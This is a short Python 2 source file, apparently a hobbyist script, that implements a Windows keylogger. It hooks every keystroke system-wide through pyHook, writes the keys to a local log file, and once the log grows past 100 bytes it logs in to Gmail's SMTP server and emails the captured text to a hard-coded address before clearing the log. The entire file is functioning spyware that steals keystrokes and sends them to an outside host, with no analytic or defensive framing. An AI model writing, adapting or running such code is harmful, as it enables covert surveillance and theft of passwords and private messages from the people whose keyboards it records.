#Author: Nishant Nischaya.

import pyHook, pythoncom, sys, logging, smtplib, os

file_log= 'C:\\important\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    # Open a file
    fo = open(file_log, "r+")
    str = fo.read(100);
    content=str
    print "Read String is : ", str
    statinfo= os.stat(file_log)
    if statinfo.st_size>100L:
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login('nishantnischaya@gmail.com','PASSWORD')
        mail.sendmail('nishantnischaya@gmail.com','nishantnischaya@gmail.com',content)
        mail.close()
        fo.seek(0)
        fo.truncate()
    # Close opend file
    fo.close()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
    
